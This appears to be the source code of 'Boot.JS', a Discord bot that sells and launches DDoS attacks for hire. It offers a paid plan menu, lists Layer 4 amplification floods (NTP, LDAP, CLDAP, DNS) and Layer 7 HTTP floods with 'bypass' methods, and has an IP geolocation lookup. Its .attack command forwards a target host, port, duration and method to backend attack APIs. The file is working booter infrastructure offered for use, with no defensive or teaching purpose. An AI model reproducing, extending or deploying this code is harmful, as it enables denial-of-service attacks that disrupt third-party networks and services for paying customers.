require('moment-duration-format');
const config = require("./database/configs.json");
const format = require('string-format')
const axios = require('axios');
const cpuStat = require('cpu-stat');
const os = require('os');
const moment = require('moment-timezone');
const setTitle = require('console-title');
const colors = require('colors');
const fs = require('fs');
const users = require('./users.json');
const Discord = require("discord.js"),
        bot = new Discord.Client(),
        client = new Discord.Client();
 
bot.login(config.token);
var cli = new Discord.Client({Authoreconnect:true});
var metodos2 = "";
var bred, red, blue, green, yellow, l4cyan, l7yellow, purple, white, lightred, lightgreen, lightpurple, redblink, swhite, whitebolado, underred, blinking, reset;
bred   = '\u001b[0;31m'
red = '\u001b[0;31m';
lightred = '\u001b[91m';
lightgreen = '\u001b[92m';
l4cyan = '\u001b[96m';
l7yellow = '\u001b[93m';
lightpurple = '\u001b[95m';
supered = '\u001b[0;31m';
underred = '\u001b[0;31m';
bgRed = '\u001b[41;92m';
bgGreen = '\u001b[41;92m';
blue  = '\u001b[0;34m';
green = '\u001b[0;32m';
yellow = '\u001b[0;33m';
reset = '\u001b[0m';
purple = '\u001b[0;35m';
white = '\u001b[0;37m';
blinking = '\u001b[0;31;5m';
redblink = '\u001b[101;30;5m';
whitebolado = '\u001b[1;37m';
swhite = '\u001b[0;37m';

var timeout = ['50', '140', '124', '84', '520', '302', '410', '1002', '913', '20', '85', '623', '150', '943', '223', '221', '220', '2043', '10', '25', '704', '120', '80']
var BasicAPI = [
"API LINK GOES HERE",
];
var networksADM = [
"",
];

var TEMPLATE = ["API LINK GOES HERE"]
var emoji = ['🆕']
var Author = ["@portlordss"]
var soma1 = BasicAPI.length
var soma2 = soma1
const thumbnails = [
"https://tenor.com/view/black-and-white-mind-crazy-shaje-gif-16607588",
"https://tenor.com/view/anonymous-anonymiss-anonymous3d-anonymousbitesback-anonymous-worldwide-gif-14794108",
"https://tenor.com/view/waves-black-sea-ocean-gif-14616544",
]
//
setTitle("[" + soma2 +"] Boot.JS │ Coded by: " + Author);
bot.on("ready", () => {

    console.log('')
    console.log('Hi! This Is a Notification TO Let The Author Know That This Bot Is Running')
    console.log()

bot.user.setPresence({
    game: {
        name: `@portlordss`,
        type: "STREAMING",
        url: "https://twitch.tv/bob"
      }
    }
  );
});

bot.on("disconnect", () => {
     console.log('Boot.JS Has Been Disconnected');
 });

bot.on("reconnecting", () => {
     console.log('Boot.JS Is Attempting TO Reconnect! @portlordss');
 });

bot.on('message', async msg => {
const args = msg.content.slice(config.prefix.length).trim().split(/ +/g);
const command = args.shift().toLowerCase();
  if(msg.author.bot) {
    return;
  }
  if(msg.channel.type === "DM") {
    return;
  }
  if(msg.content.includes('whats up')) {
    msg.channel.send('how are you')
    return;
  }
if (msg.author.id !== bot.user.id && msg.content.startsWith(config.prefix)) {

if (command === 'messageedit') {
  let bla = await msg.channel.send('Please Wait 5 Seconds')
  setTimeout(function(){
    bla.edit('Edited success');
  }, 10)
};

////////////////////////////////////////// Commands //////////////////////////////////////////

// Command HELP

if (command === 'help') {

  console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Command Used: ` + green + `.help ` + reset + `Author: ` + green + `${msg.author.username}` + reset)

  const response = new Discord.RichEmbed()
    .setColor("#000000")
    .setAuthor(`Welcome To Boot.JS Version 1.0.0`)
    .setTitle(":boom: | Boot.JS - Page: Help | :boom:")
    .setDescription("This Is The Help Menu Page, Listing All Availble Options")
    .setThumbnail('https://cdn.discordapp.com/emojis/768762627265396786.gif?v=1')
    .addField("*[* ___1___ *]* ```General```", "```css\n.rules\n.purchase\n.botinfo\n.profile```", true)
    .addField("*[* ___2___ *]* ```Attack Menu```", "```css\n.methods```", false)
    .addField("*[* ___3___ *]* ```Tools```", "```css\n.lookup [host]\n.resolve [host]```\n", false)
    .addField("*[* ___4___ *]* ```Rules```", "```css\n1. [No Refunds, Read TOS]\n2. [No Spamming Attacks!]\n3. [Dont Disrespect Our Staff]```", false)
    .addField("*[* ___5___ *]* ```Attack Command Below!```", "```css\n.attack [Host] [Port] [Time] [Method]```", false)
    .setTimestamp()
    .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
  
  msg.channel.send(response)

  return;
}

// Command Purchase

if (command === 'purchase') {
  msg.delete()

  console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Command Used: ` + green + `.buy ` + reset + `Author: ` + green + `${msg.author.username}` + reset)
  const privbuyembed = new Discord.RichEmbed()
    .setColor('#000000')
    .setTitle(':boom: | Boot.JS - Page: Purchase | :boom:')
    .setThumbnail('https://cdn.discordapp.com/emojis/768762627265396786.gif?v=1')
    .setDescription("You Know Why You're Here, Dm Me if Interested!", true)
    .addField("___Plan___", "```html\nBasic```", false)
    .addField("___Specifications___", "```html\n1500 Seconds\n1 Concurrent```", false)
    .addField("___Price___", "```html\n$15/monthly```", false)
    .addField("___Payment Options___", "***___Cashapp___*** or ***___Paypal___***")
  msg.author.send(privbuyembed)

  let buyreply = await msg.reply('We Have Sent You a DM Providing All Purchasing Info, This Message Will Be Deleted In 10 Seconds!')
  // let buyreply1 = await buyreply.react('1')
  // let buyreply2 = await buyreply1.react('2')
  // let buyreply3 = await buyreply2.react('3')
  // let buyreply4 = await buyreply3.react('4')
  // let buyreply5 = await buyreply4.react('5')
  // let buyreply6 = await buyreply5.react('6')
  // let buyreply7 = await buyreply6.react('7')
  // let buyreply8 = await buyreply7.react('8')
  // let buyreply9 = await buyreply8.react('9')
  // let buyreply10 = await buyreply9.react('10')
  // let buyreply11 = await buyreply10.react('Deleted...')
  buyreply.delete(10000)
  return;
}

// Command METHODS

if (command === 'methods') {

console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Command Used: ` + green + `.methods ` + reset + `Author: ` + green + `${msg.author.username}` + reset)

const methodsem = new Discord.RichEmbed()
  .setColor("#000000")
  .setTitle(":boom: | Boot.JS - Page: Methods | :boom:")
  .setThumbnail("https://cdn.discordapp.com/emojis/768762627265396786.gif?v=1")
  .addField("___Layer 4___", "```css\nDVR - (dvr)\nLDAP - (ldap)\nNTP - (ntp)\nDNS - (dnszao)\nCFUCK - (cfuck)\nNUKEUDP - (nudp)\nTCP-SPECIAL - (tcpzao)\nCLDAP - (cldap)\nDOMINATE - (dominate)```", false)
  .addField("___Layer 7___", "```css\nHTTPNULL-SMART - (httpsmart)\nHTTP-NULL - (httpnull)\nHTTP-SPAM - (httpspam)\nHTTP-ABUSE - (httpabuse)\nHTTP-RANDNULL - (randnull)```", false)
  .addField("___Special___", "```css\nBYPASS - (ping)\nNFO-BYPASS - (nfo)\nUDPBYPASS - (udpbypass)\nTCPBYPASS - (tcpbypass)\nAUTO-BYPASSER - (autobypass)\nGRENADE - (grenade)```", false)
  .setTimestamp()
  
return msg.channel.send(methodsem);
}

// Command GIVE

if (command === "give") {
var mention = msg.mentions.members.first();

if (!mention) {
  return msg.reply('mention a user to give a package for him.')
}

const input = args.join(" "),
  userDetails = input.split(" "),
  person = userDetails[0].replace(/[\\<>@#&!]/g, "");
  time = Number(userDetails[1]),
  conc = Number(userDetails[2]),
  length = userDetails[3],
  servers = userDetails[4],
  expire = Number(moment().add(length, "day"));
//
if (!config.admins.includes(msg.author.id))
  return msg.channel.send("You are not an admin.");
//
if (userDetails.length < 5) {
console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[DB]` + reset + ` ${msg.author.username} ` + l7yellow + `->` +  lightred + ` Wrong Configuration` + reset + ` Status: ` + red + `Incorrect Fill` + reset)
const incorrectUser = new Discord.RichEmbed()
      .setColor("BLACK")
      .setTitle("You entered the data incorrectly")
      .setDescription("```ini\n.give [user] [time] [concurrents] [days] [api/servers]```")
return msg.channel.send(incorrectUser)
}

//
if (!config.servers.networks.includes(args[4])) {
console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[DB]` + reset + ` ${msg.author.username} ` + l7yellow + `->` +  lightred + ` Wrong Configuration` + reset + ` Status: ` + red + `Server` + reset)
const metodoembed = new Discord.RichEmbed()
  .setColor("#000000")
  .setTitle("Database Editor -> Boot.JS")
  .setDescription("An `error` was identified when\nmodifying the database.")
  .addField('**Type:**', '```http\n' + 'Server' + '```', true)
  .addField('Solution:', 'Check the available\nservers in the database', true)
  .setThumbnail(`${msg.author.displayAvatarURL}`)
  .setTimestamp()
  .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
return msg.channel.send(metodoembed); }
//
function updategive(file, json) {
  fs.writeFile(file, JSON.stringify(json, null, 2), "utf8", function(err) {
    console.log(purple + "[" + reset + moment.tz("America/Sao_Paulo").format('HH:mm A') + purple + "] " + `[🧮] Banco de Dados atualizado.`);
  });
}
//
responsegive = new Discord.RichEmbed()
  .setColor("BLACK")
  .setTitle("Database Editor -> Boot.JS")
  .setThumbnail(mention.user.avatarURL)
  .setDescription(`You have modified the <@${person}>\n data in the Supreme database.`)
  .addField("Client:", mention.user.username, true)
  .addField("Seconds:", time, true)
  .addField("Concurrent:", conc, true)
  .addField("Days:", length, true)
  .addField("Server", servers, true)
  .addField("Admin:", msg.author.username, true)
  .addField("Client ID:", "```yaml\n" + mention.user.id + "```")
  .addField("Admin ID:", "```http\n" + msg.author.id + "```")
  .setTimestamp()
  .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
//
if (!users[person]) {
  makeUser(person);
}
users[person].attackTime = time;
users[person].concurrents = conc;
users[person].servers = servers;
users[person].expire = moment(expire).unix();
updategive("users.json", users);
return msg.channel.send(responsegive);

}

// Command CLEAR

if (command === "clear") {

const number = "100";
const valor = args[0] - number;
var z = (valor);

if (args < 1) {
  return msg.reply("You filled it out incorrectly.\nTry again like this:\n```ini\n.clear [number of messages]```")
}

if (args[0] > 100) {
  return msg.reply('you cannot delete more than `100` messages.')
}

if (!config.admins.includes(msg.author.id)) {
  return msg.reply("you dont have permission to execute this command.");
}

const code = args.join(" ");
var messagecount = parseInt(code);
msg.channel
 .fetchMessages({ limit: messagecount })
 .then(messages => msg.channel.bulkDelete(messages));

  let deletemessage = await msg.channel.send("> The chat was cleared and `" + args[0] + "` messages were removed.\n> This message will be deleted in 5 seconds.")
  deletemessage.react('✅')
  deletemessage.delete(5000);
  return;
}

// Command BOTINFO

if (command === 'botinfo') {

  let memory = ((process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2))
  let { version } = require("discord.js");
  let botuptime = moment.duration(bot.uptime).format(" H [hrs], m [mins]");

  cpuStat.usagePercent(function(err, percent, seconds) {
    if (err) {
      return console.log(err);
  }

  const response = new Discord.RichEmbed()
  
    .setTitle("***___Boot.JS___***")
    .setColor("RED")
    .setThumbnail(msg.author.displayAvatarURL)
    .addField("Bot:", bot.user, true)
    .addField("Mem Usage", `${memory} %`, true)
    .addField("Uptime ", `${botuptime}`, true)
    .addField("Users", `${bot.users.size.toLocaleString()}`, true)
    .addField("Servers", `${bot.guilds.size.toLocaleString()}`, true)
    .addField("Channels ", `${bot.channels.size.toLocaleString()}`, true)
    .addField("CPU usage", `\`${percent.toFixed(2)}%\``,true)

  msg.channel.send(response)})

  return;
}
// Command profile

if (command === 'profile') {
const input = args.join(" ");
const userDetails = input.split(" ");
const mention = msg.mentions.members.first();
const person = userDetails[0].replace(/[\\<>@#&!]/g, "");

  if (!users[msg.author.id]) {
    makeUser(msg.author.id);
  }

  function getRunning(person) {
    let running = 0;
    for (const attack of users[person].attacks) {
      if (attack.stamp > moment().unix() && attack.stopped === false) {
        running++;
      }
    }
    return running;
  }

function getTotal(person) {
  let total = 0;
  for (const attack of users[person].attacks) {
    total++;
  }
  return total;
}
function update(file, json) {
  fs.writeFile(file, JSON.stringify(json, null, 2), "utf8", function(err) {
    console.log(purple + "[" + reset + moment.tz("America/Sao_Paulo").format('HH:mm A') + purple + "] " + `[` +  reset + `${bot.user.username}` + purple + `] Updated database.`);
  });
}
function makeUser(person) {
  users[person] = {};
  users[person].concurrents = 0;
  users[person].attackTime = 0;
  users[person].attacks = [];
  users[person].expire = null;
  users[person].servers = "Nothing";
  update("users.json", users);
}
function expireDate(person) {
  var expire = moment.unix(users[person].expire);
  if(expire < moment().unix()) return "Expired";
  return expire.format('MMMM Do YYYY, h:mm:ss a');
}
//
if (args < 1) {
  const response = new Discord.RichEmbed()
    .setColor('#000000')
    .setThumbnail(`${msg.author.displayAvatarURL}`)
    .setAuthor(`🤖 Profile Information 🤖`)
    .addField('**Username:**', "```css\n" + msg.author.username + "```", true)
    .addField('**Network:**', "```css\n" + users[msg.author.id].servers + "```", true)
    .addField('**Running:**', "```css\n" + getRunning(msg.author.id) + "```", true)
    .addField('**Seconds:**', "```css\n" + users[msg.author.id].attackTime + "```", true)
    .addField('**Concurrents:**', "```css\n" + users[msg.author.id].concurrents + "```", true)
    .addField('**Attacks:**', "```css\n" + getTotal(msg.author.id) + "```", true)
    .addField('**Expire:**', "```css\n" + expireDate(msg.author.id) + "```")
    .addField('**Ray ID:**', "```css\n-" + msg.author.id + "```")
    .setTimestamp()
  return msg.channel.send(response)
}
if (!users[person]) {
  makeUser(person);
}

const response = new Discord.RichEmbed()

  .setColor("BLACK")
  .setAuthor(mention.user.username+ " <-- User Information", mention.user.avatarURL)
  .setThumbnail(mention.user.avatarURL)
  .addField('**Username:**', mention.user.username, true)
  .addField('**Network:**', users[person].servers, true)
  .addField('**Running:**', getRunning(mention.user.id), true)
  .addField('**Seconds:**', users[person].attackTime, true)
  .addField('**Concurrents:**', users[person].concurrents, true)
  .addField('**Attacks:**', getTotal(mention.user.id), true)
  .addField('**Expire:**', "```http\n" + expireDate(msg.author.id) + "```")
  .addField('**Ray ID:**', "```diff\n-" + msg.author.id + "```")

return msg.channel.send(response);
}

// Command TRIAL
if (command === "trial") {
  if (!config.admins.includes(msg.author.id)) {
    console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Command Used: ` + green + `.trial ` + reset + `Author: ` + green + `${msg.author.username}` + reset)
    return msg.channel.send("You are not an admin.");
  };

function update(file, json) {
  fs.writeFile(file, JSON.stringify(json, null, 2), "utf8", function(err) {
    console.log(purple + "[" + reset + moment.tz("America/Sao_Paulo").format('HH:mm A') + purple + "] " + `[` +  reset + `${bot.user.username}` + purple + `] Updated database.`);
  });
}
  const input = args.join(" "),
    userDetails = input.split(" "),
    person = userDetails[0].replace(/[\\<>@#&!]/g, ""),
    time = 30,
    conc = 1,
    length = userDetails[1],
    expire = Number(moment().add(length, "day")),
    response = new Discord.RichEmbed()
      .setColor("#000000")
      .setTitle(":file_folder: > Give")
      .setDescription(`You have updated <@${person}>.`)
      .addField("Concurrents", conc, true)
      .addField("Attack Time", time, true)
      .setTimestamp()
      .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
  if (userDetails.length < 2) {
    return msg.channel.send("Please fill the command in correctly.```" + `${config.prefix}trial <person> <days>` + "```");
  }
  if (!users[person]) {
    makeUser(person);
  }
  users[person].attackTime = time;
  users[person].concurrents = conc;
  users[person].servers = "Simple";
  users[person].expire = moment(expire).unix();
  update("users.json", users);
  return msg.channel.send(response);
}

// Command LOOKUP
if (command === 'lookup') {

if (args.length < 1) {
console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `Incorrect Fill` + reset + ` Network: ` + purple + `PAID`)
//  
  const lookembed = new Discord.RichEmbed()
    .setColor("#000000")
    .setTitle("ERROR LOG")
    .setThumbnail(`${msg.author.displayAvatarURL}`)
    .addField("**Error**", "You filled in the data ***incorrectly***, look at the **correct** form below:")
    .addField("**__Correct Form__**", "```ini\n!lookup [host]```", true)
    .addField("**__Author__**", "```ini\n" + msg.author.username + "```", true)
    .setTimestamp()
    .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
  return msg.channel.send(lookembed);
//
}
const { data } = await axios.get(`http://free.ipwhois.io/json/${args[0]}`),
//
   response = new Discord.RichEmbed()
    .setColor("#000000")
    .setTitle(":boom: | Boot.JS - Page: Lookup | :boom:")
    .setDescription("IP Lookup")
    .setThumbnail("https://cdn.discordapp.com/attachments/668654887650983936/668678545131831306/1024px-Circle-icons-tools.png")
    .addField("```IP```", "```yaml\n" + data.ip + "```", true)
    .addField("```CONTINENT```", "```yaml\n" + data.continent + "```", true)
    .addField("```TYPE```", "```yaml\n" + data.type + "```", true)
    .addField("```COUNTRY```", "```http\n" + data.country + "```", true)
    .addField("```STATE```", "```http\n" + data.region + "```", true)
    .addField("```CITY```", "```http\n" + data.city + "```", true)
    .addField("```ISP```", "```yaml\n" + data.isp + "```", true)
    .addField("```AUTHOR```", "```yaml\n" + msg.author.username + "```", true)
    .addBlankField(true)
    .setTimestamp()
    console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + green + `[API] ` + reset + `Tool:` + green + ` GEO-LOOK ` + reset + `Host: ` + green + args[0] + reset + ` Type: ` + green + data.type + reset + ` Author: ` + green + `${msg.author.username}`)
  return msg.channel.send(response);

}
//// Command START

if (command === 'attack') {
//return msg.channel.send("Under Maintenance bro")
      const target = args[0];
      const port = args[1];
      const time = args[2];
      const method = args[3]

function hasPackage(person) {
  var expire = users[person].expire;

  if(expire > moment().unix()) {
    return true;
  } else {
    return false;
  }
}

if (!hasPackage(msg.author.id)) {
  msg.reply('You dont have a package.')
  return;
}

let serverusers;
  if (users[msg.author.id].servers.includes("Basic")) {
    server = BasicAPI;
    size = BasicAPI.length;
    network = "Basic";
    plano = "Basics"
  } else {
    server = "No Plan"
  }
//
function update(file, json) {
  fs.writeFile(file, JSON.stringify(json, null, 2), "utf8", function(err) {
    console.log(purple + "[" + reset + moment.tz("America/Sao_Paulo").format('HH:mm A') + purple + "] " + `[` +  reset + `${bot.user.username}` + purple + `] Updated database.`);
  });
}

function makeUser(person) {
  users[person] = {};
  users[person].concurrents = 0;
  users[person].attackTime = 0;
  users[person].attacks = [];
  users[person].expire = null;
  update("users.json", users);
}

if (!users[msg.author.id]) {
  makeUser(msg.author.id);
}

function getRunning(person) {
  let running = 0;
  for (const attack of users[person].attacks) {
    if (attack.stamp > moment().unix() && attack.stopped === false) {
      running++;
    }
  }
  return running;
}

const running = await getRunning(msg.author.id);
if (running >= users[msg.author.id].concurrents) {
  msg.reply("You have much attacks running, wait one finish.")
  return;
}

function validatePort(port) {
    if (port > 0 & port < 65535) {
        return (true)
    }
    return (false)
}

if (args.length < 4) {
    msg.reply('blabla')
  return;
}

if(config.blacklist.hosts.includes(args[0])){
  console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `BlackList ` + reset + `Host: ` + green + args[0] + reset + ` Network: ` + purple + `PAID`)
    const blackembed = new Discord.RichEmbed()
      .setColor("#ff0000")
      .setTitle(":boom: | Boot.JS - Page: ERROR | :boom:")
      .setDescription("BlackList")
      .setThumbnail(`${msg.author.displayAvatarURL}`)
      .addField("**__Error__**", "You cannot send attacks to this Host,\n this ip is blacklisted", true)
      .addField("**__Host__**", "**" + args[0] + "**", true)
      .setTimestamp()
      .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
    return msg.channel.send(blackembed);
} else {
    if (!args[0] || !args[1] || !args[2] || !args[3]) return;
    if (!validatePort(args[1])) {
      console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `Invalid port` + reset + ` Network: ` + purple + `PAID`)
      const portembed = new Discord.RichEmbed()
        .setColor("#ff0000")
        .setTitle(":boom: | Boot.JS - Page: ERROR | :boom:")
        .setDescription("Invalid Port")
        .setThumbnail(`${msg.author.displayAvatarURL}`)
        .addField("**__Error__**", "The port you chose cannot be used. You can choose ports between `1` and `65535`.")
        .setTimestamp()
        .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
      return msg.channel.send(portembed);
    }
    for (var i = 0; i < config.methods.layer4.length; i++) {
        metodos2 = metodos2 + config.methods.layer7[i] + " " + config.methods.layer4[i];
    }
    if (!metodos2.includes(args[3].toUpperCase())) {
      console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `Método inválido` + reset + ` Network: ` + purple + `PAID`)
      const metodoembed = new Discord.RichEmbed()
        .setColor("#ff0000")
        .setTitle(":boom: | Boot.JS - Page: ERROR | :boom:")
        .setDescription("Invalid Method")
        .setThumbnail(`${msg.author.displayAvatarURL}`)
        .addField("**__Error__**", "The method you requested was not found in the Supreme database, use: `.methods` to check the available methods.", true)
        .addField("**__Host__**", "**" + args[0] + "**", true)
        .setTimestamp()
        .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
      return msg.channel.send(metodoembed);
    }
      if (users[msg.author.id].attackTime < args[2]) {
        console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `TIME` + reset + ` Network: ` + purple + `Simple`)
        const plan1 = new Discord.RichEmbed()
          .setColor("#ff0000")
          .setTitle(":boom: | Boot.JS - Page: ERROR | :boom:")
          .setDescription("Maximum Time Exceeded")
          .setThumbnail(`${msg.author.displayAvatarURL}`)
          .addField("**__Typed Time__**", "**" + args[2] + "**", true)
          .addField("**__Maximum Time__**", `${users[msg.author.id].attackTime}`, true)
          .addField("**__Your Plan__**", "**Basic**", true)
          .setTimestamp()
          .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
        return msg.channel.send(plan1);
      }
    for (var i = 0; i < server.length; i++) {
        axios.get(format(server[i], target, port, time, method.toUpperCase())).catch(error => {
            console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + "[✘] " + reset + error)
            const embed1 = new Discord.RichEmbed()
              .setColor("#ff0000")
              .setTitle(":boom: | Boot.JS - Page: ERROR | :boom:")
              .setDescription(error)
              .setTimestamp()
              .setFooter("Server Down");
            const erros = bot.channels.get(config.channels.error);
            return erros.send(embed1);
        })
    }
//    const { data } = await axios.get(`http://free.ipwhois.io/json/${args[0]}`)
// IMPORTANT: THIS DATA (in up line) DONT WORK IN WEBSITES!!!!!
    const sec = ['SEC']
    const n = ['']
    const embed2 = new Discord.RichEmbed()
      .setAuthor(`Attack Sent!`,"https://cdn.discordapp.com/emojis/768762627265396786.gif?v=1")
      .setTitle("```[🔥] Boot.JS | ATTACK SENT [🔥]```")
      .setColor("#000000")
      .setThumbnail("https://cdn.discordapp.com/emojis/768762627265396786.gif?v=1")
      .addField("**[1] __Host__**", "```css\n" + target + "```", true)
      .addField("**[2] __Port__**", "```yaml\n" + port + "```", true)
      .addField("**[3] __Time__**", "```glsl\n" + time + " " + sec + "```", true)
      .addField("**[4] __Method__**", "```yaml\n" + method.toUpperCase() + "```", true)
      .addField("**[5] __Servers__**", "```http\n" + size + "```", true)
      .addField("**[6] __Plan__**", "```\n" + users[msg.author.id].servers + "```", true)
      .addField("**[7] __Network__**", "```http\n" + network + "```", true)
      .addField("**[8] __Response__**", "```glsl\n" + (timeout[Math.floor(Math.random() * timeout.length)]) + " ms```", true)
      .addField("**[9] __Moment__**", "```glsl\n" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "```", true)
      //.addField("**[10] __ISP__**", "```http\n" + data.isp + "```")
      .setTimestamp()
//
      const canal = bot.channels.get(config.channels.logs);
      canal.send(embed2);
//
      let reply = await msg.reply('your attack was successfully sent.\nFor more information')
      reply.react('✅')
//
      var expirer = moment().add(time, "second");
      users[msg.author.id].attacks.push({
      target,
      port,
      time,
      method: method.toUpperCase(),
      stamp: moment(expirer).unix(),
      stopped: false
    });
    update("users.json", users);
  }
return;
}}
});